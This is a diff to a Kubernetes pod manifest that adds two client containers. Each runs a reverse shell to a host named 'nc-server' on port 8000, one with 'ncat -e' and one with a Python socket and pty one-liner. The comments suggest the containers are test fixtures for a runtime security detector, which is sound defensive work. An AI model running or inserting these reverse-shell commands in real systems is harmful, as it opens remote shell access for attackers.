@@ -67,7 +67,18 @@ spec:
       containers:
         - name: client
           image: busybox
+          # Should trigger tty write.
           command:
-            - sleep
-            - infinity
+            - /bin/sh
+            - -c
+            - |-
+              ncat -e `/bin/sh -i` nc-server 8000
+        # Should trigger stdio via socket.
+        - name: client2
+          image: python3
+          command:
+            - /bin/sh
+            - -c
+            - |-
+              python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("nc-server",8000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
       terminationGracePeriodSeconds: 0
